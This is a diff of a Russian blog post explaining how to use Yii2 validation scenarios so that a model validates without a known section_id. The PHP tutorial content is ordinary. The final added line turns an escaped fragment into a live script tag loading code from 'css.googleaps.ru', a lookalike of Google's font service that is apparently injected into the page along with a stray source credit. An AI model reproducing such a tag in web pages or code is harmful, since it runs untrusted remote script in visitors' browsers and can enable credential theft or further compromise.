@@ -21,8 +21,8 @@ tags:
 - yii
 comments: []
 ---
-<p>Ситуация, когда надо провалидировать модель, но некоторые <code>required<&#47;code> по-умолчанию поля неизвестны. Например, неизвестен <code>id<&#47;code> связанной модели.&nbsp;Для решения подобных ситуаций можно использовать сценарии.<&#47;p></p>
-<p>Есть модель <code>Control<&#47;code>, которая связана с моделю <code>Section<&#47;code> через поле <code>section_id<&#47;code>:<&#47;p></p>
+<p>Ситуация, когда надо провалидировать модель, но некоторые <code>required</code> по-умолчанию поля неизвестны. Например, неизвестен <code>id</code> связанной модели.&nbsp;Для решения подобных ситуаций можно использовать сценарии.</p></p>
+<p>Есть модель <code>Control</code>, которая связана с моделю <code>Section</code> через поле <code>section_id</code>:</p></p>
 <pre class="brush: php; title: ; notranslate">
 class Control extends ActiveRecord<br />
 {<br />
@@ -40,34 +40,34 @@ class Control extends ActiveRecord<br />
             [['section_id'], 'exist', 'skipOnError' => true, 'targetClass' => Section::className(), 'targetAttribute' => ['section_id' => 'id']],<br />
         ];<br />
     }</p>
-<p>    &#47;**<br />
+<p>    /**<br />
      * @return yiidbActiveQuery<br />
-     *&#47;<br />
+     */<br />
     public function getSection()<br />
     {<br />
         return $this->hasOne(Section::className(), ['id' => 'section_id']);<br />
     }<br />
 }<br />
-<&#47;pre></p>
-<p>Мне нужно провалидировать модель не зная <code>section_id<&#47;code>.<br &#47;><br />
-<span id="more-453"><&#47;span><&#47;p></p>
-<p>Сценарий, который используется по-умолчанию, имеет имя <code>default<&#47;code>. Создаю новый сценарий, называю его <code>without_section<&#47;code>. Переписываю&#47;добавляю в <code>rules()<&#47;code> правила для тех полей, которые он затрагивает. В моем случае это правило <code>required<&#47;code>, в котором это поле должно отсутствовать:<&#47;p></p>
+</pre></p>
+<p>Мне нужно провалидировать модель не зная <code>section_id</code>.<br /><br />
+<span id="more-453"></span></p></p>
+<p>Сценарий, который используется по-умолчанию, имеет имя <code>default</code>. Создаю новый сценарий, называю его <code>without_section</code>. Переписываю/добавляю в <code>rules()</code> правила для тех полей, которые он затрагивает. В моем случае это правило <code>required</code>, в котором это поле должно отсутствовать:</p></p>
 <pre class="brush: php; title: ; notranslate">
 [['alias', 'label'], 'required', 'on' => 'without_section'],<br />
-<&#47;pre></p>
-<p>Второй шаг &#8212; нужно дополнить функцию <code>scenarios()<&#47;code>, в которой надо добавить этот новый сценарий и прописать все поля, которые будут валидироваться при этом сценарии:<&#47;p></p>
+</pre></p>
+<p>Второй шаг &#8212; нужно дополнить функцию <code>scenarios()</code>, в которой надо добавить этот новый сценарий и прописать все поля, которые будут валидироваться при этом сценарии:</p></p>
 <pre class="brush: php; title: ; notranslate">
-    &#47;**<br />
+    /**<br />
      * @return array<br />
-     *&#47;<br />
+     */<br />
     public function scenarios()<br />
     {<br />
         $scenarios = parent::scenarios();<br />
         $scenarios['without_section'] = ['alias', 'label', 'description', 'default'];<br />
         return $scenarios;<br />
     }<br />
-<&#47;pre></p>
-<p>В итоге класс приобритет следующий вид:<&#47;p></p>
+</pre></p>
+<p>В итоге класс приобритет следующий вид:</p></p>
 <pre class="brush: php; title: ; notranslate">
 class Control extends ActiveRecord<br />
 {<br />
@@ -76,9 +76,9 @@ class Control extends ActiveRecord<br />
     {<br />
         return 'control';<br />
     }</p>
-<p>    &#47;**<br />
+<p>    /**<br />
      * @return array<br />
-     *&#47;<br />
+     */<br />
     public function scenarios()<br />
     {<br />
         $scenarios = parent::scenarios();<br />
@@ -96,17 +96,17 @@ class Control extends ActiveRecord<br />
             [['section_id'], 'exist', 'skipOnError' => true, 'targetClass' => Section::className(), 'targetAttribute' => ['section_id' => 'id']],<br />
         ];<br />
     }</p>
-<p>    &#47;**<br />
+<p>    /**<br />
      * @return yiidbActiveQuery<br />
-     *&#47;<br />
+     */<br />
     public function getSection()<br />
     {<br />
         return $this->hasOne(Section::className(), ['id' => 'section_id']);<br />
     }<br />
 }<br />
-<&#47;pre></p>
-<p>Вызывать модель перед валидацией будем так:<&#47;p></p>
+</pre></p>
+<p>Вызывать модель перед валидацией будем так:</p></p>
 <pre class="brush: php; title: ; notranslate">
 $model = new Control(['scenario' => Control::SCENARIO_WITHOUT_SECTION]);<br />
-<&#47;pre><br />
-Source: vingtsun-grodno.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
+</pre><br />
+Source: vingtsun-grodno.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
